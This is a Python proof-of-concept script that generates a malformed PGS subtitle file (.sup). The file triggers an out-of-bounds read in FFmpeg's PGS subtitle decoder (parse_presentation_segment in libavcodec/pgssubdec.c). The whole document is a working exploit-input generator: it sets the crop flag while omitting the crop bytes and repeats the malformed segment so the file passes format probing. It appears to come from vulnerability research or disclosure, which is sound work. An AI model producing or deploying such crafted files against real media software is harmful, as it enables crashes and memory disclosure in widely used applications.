#!/usr/bin/env python3
"""
PoC generator for VULN 001: CWE-125 Out-of-bounds Read in parse_presentation_segment()
File: libavcodec/pgssubdec.c, lines 449-468

The vulnerability:
  - The code checks buf_end - buf < 8 (passes when exactly 8 bytes remain)
  - Reads 8 bytes for the object basic fields (consuming all remaining bytes)
  - Then checks composition_flag & 0x80 (crop flag) and reads 8 MORE bytes
    without a bounds check, going past buf_end.

Strategy:
  - Set PCS segment_length = 19 (11-byte PCS header + 8-byte object entry)
  - Set composition_flag = 0x80 so crop read is triggered
  - buf_end is exactly at offset 19; after reading the 8 object bytes buf == buf_end
  - The 8-byte crop read goes 8 bytes past buf_end -> OOB read
"""

import struct
import os

OUTPUT_FILE = os.path.join(os.path.dirname(__file__), "vuln_001.sup")


def pgs_packet(segment_type: int, data: bytes, pts: int = 0, dts: int = 0) -> bytes:
    """Build one PGS packet: PG magic + pts + dts + type + length + data."""
    magic = b'PG'
    header = struct.pack('>IIBH', pts, dts, segment_type, len(data))
    return magic + header + data


def build_malformed_pcs() -> bytes:
    """
    Build a Presentation Composition Segment (PCS, type=0x16) that triggers
    the OOB read.

    PCS header (11 bytes):
      video_w(2)              = 1920
      video_h(2)              = 1080
      frame_rate(1)           = 0x10
      composition_number(2)   = 0
      composition_state(1)    = 0x00  (Normal)
      palette_update_flag(1)  = 0x00
      palette_id(1)           = 0x00
      num_composition_objects(1) = 1

    Object entry (8 bytes) - exactly fills the rest of segment_length=19:
      object_id(2)            = 0
      window_id(1)            = 0
      composition_flag(1)     = 0x80  <-- crop flag SET, NO crop data follows
      x(2)                    = 0
      y(2)                    = 0

    Total PCS data = 19 bytes.
    The decoder reads the 8 object bytes so buf == buf_end, then tries to read
    8 crop bytes past buf_end.
    """
    pcs_header = struct.pack(
        '>HHBHBBBB',
        1920,   # video_w
        1080,   # video_h
        0x10,   # frame_rate
        0,      # composition_number
        0x00,   # composition_state (Normal, upper 2 bits = 0b00)
        0x00,   # palette_update_flag
        0x00,   # palette_id
        1,      # num_composition_objects
    )
    assert len(pcs_header) == 11, f"PCS header must be 11 bytes, got {len(pcs_header)}"

    obj_entry = struct.pack(
        '>HBBHH',
        0,      # object_id
        0,      # window_id
        0x80,   # composition_flag: crop flag set (0x80) but NO crop data!
        0,      # x
        0,      # y
    )
    assert len(obj_entry) == 8, f"Object entry must be 8 bytes, got {len(obj_entry)}"

    pcs_data = pcs_header + obj_entry
    assert len(pcs_data) == 19, f"PCS data must be 19 bytes, got {len(pcs_data)}"
    return pcs_data


def build_end_packet(pts: int = 0) -> bytes:
    """Build an END (Display End) segment packet (type=0x80, length=0)."""
    return pgs_packet(0x80, b'', pts=pts)


def build_sup() -> bytes:
    """
    Build a SUP (raw PGS stream) file.

    To improve probe score (need >=2 packets for low-score detection) and to
    ensure packets survive avformat_find_stream_info for actual decoding, we
    include multiple PCS+END pairs. Each PCS triggers the OOB read.

    Probe score table (sup_probe):
      nb_packets < 2  -> AVPROBE_SCORE_RETRY/2 = 12  (too low)
      nb_packets >= 2 -> AVPROBE_SCORE_RETRY   = 25  (acceptable)
      nb_packets >= 4 -> AVPROBE_SCORE_EXTENSION= 50
    """
    pcs_data = build_malformed_pcs()
    packets = []
    # Emit 5 PCS + END pairs so the probe score is AVPROBE_SCORE_EXTENSION (50)
    for i in range(5):
        pts = i * 90000  # 1 second apart in PTS (90kHz clock)
        packets.append(pgs_packet(0x16, pcs_data, pts=pts))
        packets.append(build_end_packet(pts=pts))
    return b''.join(packets)


def main():
    sup_bytes = build_sup()
    with open(OUTPUT_FILE, 'wb') as f:
        f.write(sup_bytes)
    print(f"[+] Written {len(sup_bytes)} bytes to {OUTPUT_FILE}")
    print(f"[+] 5 PCS+END pairs; each PCS: segment_length=19, composition_flag=0x80")
    print(f"[+] After reading 8-byte object fields, buf == buf_end (per PCS)")
    print(f"[+] Crop read (8 bytes) goes past buf_end -> OOB read")


if __name__ == '__main__':
    main()
